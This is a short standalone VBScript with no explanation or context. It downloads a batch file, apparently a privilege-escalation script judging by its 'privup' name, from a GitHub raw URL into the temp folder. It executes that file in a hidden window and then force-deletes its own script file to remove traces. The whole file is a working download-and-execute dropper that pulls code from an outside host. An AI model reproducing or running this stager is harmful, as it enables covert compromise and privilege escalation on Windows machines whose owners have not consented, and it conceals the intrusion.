Dim i, objFile, objFSO, objHTTP, strFile
Set WshShell = CreateObject("WScript.Shell")
Home = WshShell.ExpandEnvironmentStrings("%tmp%")
file = Home & "\priv.bat"
myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/OLDpastebin-privup.bat"
myPath = file
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set objFSO = CreateObject( "Scripting.FileSystemObject" )
If objFSO.FolderExists( myPath ) Then
    strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
    strFile = myPath
End If
Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
objHTTP.Open "GET", myURL, False
objHTTP.Send
For i = 1 To LenB( objHTTP.ResponseBody )
    objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
Next
objFile.Close()
Set WshShell = CreateObject("WScript.Shell")
cmd="cmd /c "&file
WshShell.Run cmd, 0, True
Set WshShell = Nothing
Set objShell = CreateObject("Wscript.Shell")
strPath = Wscript.ScriptFullName
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.GetFile(strPath)
Set WshShell = CreateObject("WScript.Shell")
cmd="cmd /c del /f "&objFile
WshShell.Run cmd, 0, True
Set WshShell = Nothing
